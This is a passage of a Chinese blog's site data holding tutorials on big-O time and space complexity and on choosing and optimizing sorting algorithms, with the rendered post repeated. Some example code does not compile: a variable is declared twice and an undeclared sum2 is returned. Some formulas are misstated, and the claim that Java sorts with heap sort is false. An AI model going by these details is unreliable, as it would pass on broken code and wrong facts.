表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。</p>\n<p>所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。</p>\n<p>在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $;</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"时间复杂度分析\"><a href=\"#时间复杂度分析\" class=\"headerlink\" title=\"时间复杂度分析\"></a>时间复杂度分析</h3></div><br></div>\n\n<p>前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？</p>\n<h4 id=\"1、只关注循环次数最多的一段代码\"><a href=\"#1、只关注循环次数最多的一段代码\" class=\"headerlink\" title=\"1、只关注循环次数最多的一段代码\"></a>1、只关注循环次数最多的一段代码</h4><p>在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。</p>\n<h4 id=\"2、加法法则：总复杂度等于量级最大的那段代码的复杂度\"><a href=\"#2、加法法则：总复杂度等于量级最大的那段代码的复杂度\" class=\"headerlink\" title=\"2、加法法则：总复杂度等于量级最大的那段代码的复杂度\"></a>2、加法法则：总复杂度等于量级最大的那段代码的复杂度</h4><p>如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。</p>\n<p>注意：<br>当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。</p>\n<h4 id=\"3、乘法法则-嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\"><a href=\"#3、乘法法则-嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\" class=\"headerlink\" title=\"3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\"></a>3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积</h4><p>比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) * O(n) = O(n^2) $ </p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"几种常见时间复杂度\"><a href=\"#几种常见时间复杂度\" class=\"headerlink\" title=\"几种常见时间复杂度\"></a>几种常见时间复杂度</h3></div><br></div>\n\n\n<h4 id=\"1、-O-1\"><a href=\"#1、-O-1\" class=\"headerlink\" title=\"1、$O(1)$\"></a>1、$O(1)$</h4><p>O(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。</p>\n<h4 id=\"2、-O-logN-、O-N-logN\"><a href=\"#2、-O-logN-、O-N-logN\" class=\"headerlink\" title=\"2、$ O(logN)、O(N*logN) $\"></a>2、$ O(logN)、O(N*logN) $</h4><p>对数阶的时间复杂度非常常见，同时也是最难分析的一种。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt;= n)&#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8……,所以i的取值规律为 $$ 2^0 \\&nbsp;&nbsp;&nbsp;&nbsp;  2^1 \\&nbsp;&nbsp;  2^2 \\&nbsp;&nbsp; 2^3 …  2^k… 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\\log_2 N) $。</p>\n<p>如果把代码改为如下。那时间复杂度是多少呢？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt;= n)&#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。</p>\n<p>实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？</p>\n<p>我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32*log_2N $，所以$ O(log_32) = O(C * log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： <strong>在采用大O标记复杂度的时候，可以忽略系数，即$ O(C*f(n)) = O(f(n)) $</strong>。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。</p>\n<p>如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。</p>\n<h4 id=\"2、-O-m-n-、O-m-n\"><a href=\"#2、-O-m-n-、O-m-n\" class=\"headerlink\" title=\"2、$ O(m+n)、O(m*n) $\"></a>2、$ O(m+n)、O(m*n) $</h4><p>我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;=m; i++)&#123;</span><br><span class=\"line\">    sum1 += i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j&lt;=m; j++)&#123;</span><br><span class=\"line\">    sum1 += j;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum1+sum2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$，</p>\n<p>针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) * f(n)) $。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"空间复杂度\"><a href=\"#空间复杂度\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h3></div><br></div>\n\n<p>前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。</p>\n<p>还是拿具体的例子说明(仅供测试,一般没人这么写)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span>[] a = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    a[i] = i*<span class=\"number\">1</span>;</span><br><span class=\"line\">    print(a[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n).</p>\n<p>我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。</p>\n<p><br></p>\n","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"为什么需要复杂度分析\"><a href=\"#为什么需要复杂度分析\" class=\"headerlink\" title=\"为什么需要复杂度分析\"></a>为什么需要复杂度分析</h3></div><br></div>\n\n<p>有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？</p>\n<ul>\n<li><p>1、首先，这种评估方法确实是准确的，但是这种方法是”事后统计法”，<strong>是有非常大的局限性</strong>。</p>\n</li>\n<li><p>2、<strong>测试结果非常依赖测试环境</strong>，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。</p>\n</li>\n<li><p>3、对于<strong>不同的数据集，如果数据的有序程度不一样</strong>，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，<strong>数据规模的大小</strong>也可能对算法产生影响。</p>\n</li>\n</ul>\n<p>因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"大O复杂度表示法\"><a href=\"#大O复杂度表示法\" class=\"headerlink\" title=\"大O复杂度表示法\"></a>大O复杂度表示法</h3></div><br></div>\n\n<p>算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？</p>\n<p>这里举一个简单的例子，求解1，2，3……n 的累加和，以下为一个简单的代码实现：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;=n; i++)&#123;</span><br><span class=\"line\">    sum += i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从CPU的角度看，每一行代码都执行着类似的操作：<strong>读数据-运算-写数据</strong>。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算：</p>\n<p>第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \\times n \\times time $，所以此段代码执行的时间为$ (2n + 1)\\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。</p>\n<p>按照这个思路，再对以下代码段进行分析：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i &lt;= n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j &lt;= n; j++)&#123;</span><br><span class=\"line\">      sum += i*j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？</p>\n<p>第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n*time $,内层循环第四、五行代码都执行了$ n*n $次,需要的时间为$ 2*n^2*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)*time $。</p>\n<p>尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律：</p>\n<div style=\"text-align: center; color: red;\"><br><blockquote class=\"blockquote-center\"><p>所有的代码执行时间T(n)与每行代码的执行次数成正比<br>$$ T(n) = O(f(n)) $$</p>\n</blockquote><br></div>\n\n<p>其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。</p>\n<p>所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。</p>\n<p>在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $;</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"时间复杂度分析\"><a href=\"#时间复杂度分析\" class=\"headerlink\" title=\"时间复杂度分析\"></a>时间复杂度分析</h3></div><br></div>\n\n<p>前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？</p>\n<h4 id=\"1、只关注循环次数最多的一段代码\"><a href=\"#1、只关注循环次数最多的一段代码\" class=\"headerlink\" title=\"1、只关注循环次数最多的一段代码\"></a>1、只关注循环次数最多的一段代码</h4><p>在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。</p>\n<h4 id=\"2、加法法则：总复杂度等于量级最大的那段代码的复杂度\"><a href=\"#2、加法法则：总复杂度等于量级最大的那段代码的复杂度\" class=\"headerlink\" title=\"2、加法法则：总复杂度等于量级最大的那段代码的复杂度\"></a>2、加法法则：总复杂度等于量级最大的那段代码的复杂度</h4><p>如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。</p>\n<p>注意：<br>当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。</p>\n<h4 id=\"3、乘法法则-嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\"><a href=\"#3、乘法法则-嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\" class=\"headerlink\" title=\"3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\"></a>3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积</h4><p>比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) * O(n) = O(n^2) $ </p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"几种常见时间复杂度\"><a href=\"#几种常见时间复杂度\" class=\"headerlink\" title=\"几种常见时间复杂度\"></a>几种常见时间复杂度</h3></div><br></div>\n\n\n<h4 id=\"1、-O-1\"><a href=\"#1、-O-1\" class=\"headerlink\" title=\"1、$O(1)$\"></a>1、$O(1)$</h4><p>O(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。</p>\n<h4 id=\"2、-O-logN-、O-N-logN\"><a href=\"#2、-O-logN-、O-N-logN\" class=\"headerlink\" title=\"2、$ O(logN)、O(N*logN) $\"></a>2、$ O(logN)、O(N*logN) $</h4><p>对数阶的时间复杂度非常常见，同时也是最难分析的一种。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt;= n)&#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8……,所以i的取值规律为 $$ 2^0 \\&nbsp;&nbsp;&nbsp;&nbsp;  2^1 \\&nbsp;&nbsp;  2^2 \\&nbsp;&nbsp; 2^3 …  2^k… 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\\log_2 N) $。</p>\n<p>如果把代码改为如下。那时间复杂度是多少呢？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt;= n)&#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。</p>\n<p>实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？</p>\n<p>我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32*log_2N $，所以$ O(log_32) = O(C * log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： <strong>在采用大O标记复杂度的时候，可以忽略系数，即$ O(C*f(n)) = O(f(n)) $</strong>。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。</p>\n<p>如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。</p>\n<h4 id=\"2、-O-m-n-、O-m-n\"><a href=\"#2、-O-m-n-、O-m-n\" class=\"headerlink\" title=\"2、$ O(m+n)、O(m*n) $\"></a>2、$ O(m+n)、O(m*n) $</h4><p>我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;=m; i++)&#123;</span><br><span class=\"line\">    sum1 += i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j&lt;=m; j++)&#123;</span><br><span class=\"line\">    sum1 += j;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum1+sum2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$，</p>\n<p>针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) * f(n)) $。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"空间复杂度\"><a href=\"#空间复杂度\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h3></div><br></div>\n\n<p>前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。</p>\n<p>还是拿具体的例子说明(仅供测试,一般没人这么写)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span>[] a = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    a[i] = i*<span class=\"number\">1</span>;</span><br><span class=\"line\">    print(a[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n).</p>\n<p>我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。</p>\n<p><br></p>\n"},{"title":"算法-排序优化","date":"2018-11-09T06:30:30.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n几乎所有的编程语言中都会提供排序函数，比如C语言中qsort()，C++ STL中的sort()、stable_sort()，还有java中Collections.sort()。在平时开发中，我们都是直接使用这些现成的函数来实现业务逻辑中的排序功能。那你知道这些排序函数是如何实现的吗？底层都利用了那些排序算法？\n\n基于这些问题，今天我们就来看看排序这部分的最后一块内容:**如何实现一个通用的、高性能的排序算法？**\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何选择合适的排序算法？\n{% endnote %}\n</div>\n\n如果要实现一个通用的、高效率的排序函数，我们应该选择哪种排序算法？我们先回顾一下前面讲过的几种排序算法。\n\n| 排序算法 | 时间复杂度  | 是否稳定排序？ | 是否原地排序？|\n|---------|-------------|---------------|--------------|\n| 冒泡排序 | $O(n^2)$    | √             | √            |\n| 插入排序 | $O(n^2)$    | √             | √            |\n| 选择排序 | $O(n^2)$    | ×             | √            |\n| 归并排序 | $O(n*logn)$ | √             | ×            |\n| 快速排序 | $O(n*logn)$ | ×             | √            |\n| 桶排序   | $O(n)$      | √             | ×            |\n| 计数排序 | $O(n+k)$    | √             | ×            |\n| 基数排序 | $O(dn)$     | √             | ×            |\n\n\n我们前面讲过，线性排序算法的时间复杂度比较低，适用场景比较特殊。所以如果要写一个通用排序函数，不能选择线性排序算法。\n\n如果对小规模数据进行排序，可以选择时间复杂度为$O(n^2)$的排序算法，如果对大规模数据进行排序，时间复杂度是$O(n\\*logn)$的的算法更加高效。所以，为了兼顾任意规模数据的排序，一般都会首选时间复杂度为$O(n\\*logn)$的算法来实现排序函数。\n\n时间复杂度为$O(n\\*logn)$的函数不止一个，我们已经讲过的有归并排序、快速排序。后面讲堆的时候我们还会讲堆排序。堆排序和快速排序都有比较多的应用，比如java语言采用堆排序实现排序函数，C语言使用排序排序实现排序函数。\n\n不知道你有没有发现，使用归并排序的情况其实并不多。我们知道，快速排序最坏情况下时间复杂度是$O(n^2)$。而归并排序可以做到平均情况、最坏情况的时间复杂度都是$O(n\\*logn)$，从这点看起来很诱人，那为什么它还是没能得到“宠幸”呢？\n\n还记得我们上一节将的归并排序的空间复杂度吗？归并排序并不是原地排序算法，空间复杂度是$O(n)$，所以，粗略的将，如果要排序100MB的数据，除了数据本身占用的内存之外，排序算法还要额外在占用100MB的内存空间，空间消耗就翻倍了。\n\n前面我们讲到，快速排序比较适合用来实现排序函数，但是我们也知道，快速排序在最坏情况下时间复杂度是O(n^2),如何来解决这个“复杂度恶化”问题呢？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何优化快速排序？\n{% endnote %}\n</div>\n\n我们先来看下，为什么最坏情况下快速排序的时间复杂度是O(n^2)呢？我们前面讲过，如果数据原来就是有序或者接近有序的，每次分区点都选择最后一个数据，那快速排序算法就会变得非常糟糕，时间复杂度就会退化为O(n^2)。实际上，这种O(n^2)时间复杂度出现的主要原因还是因为我们分区点选择的不够合理。\n\n那什么样的分区点是好的分区点呢？或者说如何来选择分区点呢？\n\n最理想的分区点是：**被分开的两个分区中，数据的数量差不多**\n\n如果很粗暴的直接选择第一个或者最后一个数据最为分区点，不考虑数据的特点，肯定会出现前面讲的那样，在某些情况下，排序的最坏情况时间复杂度是O(N^2)。为了提高算法的性能，我们也要尽可能的让每次分区都比较平均。\n\n我这里介绍两种比较常用、比较简单的分区算法，你可以直观感受一下。\n\n#### 1、三数取中法\n\n我们从区间的首、尾、中间，分别取一个数，然后对比大小，取这三个数的中间值作为分区点。这样每间隔某个固定的长度，取数据出来比较，将中间值作为分区点的分区算法，肯定要比单纯取某一个数据更好。但是，如果要排序的数组比较大，那三数取中可能就不够了，可能要“五数取中”或者\"十数取中\"。\n\n#### 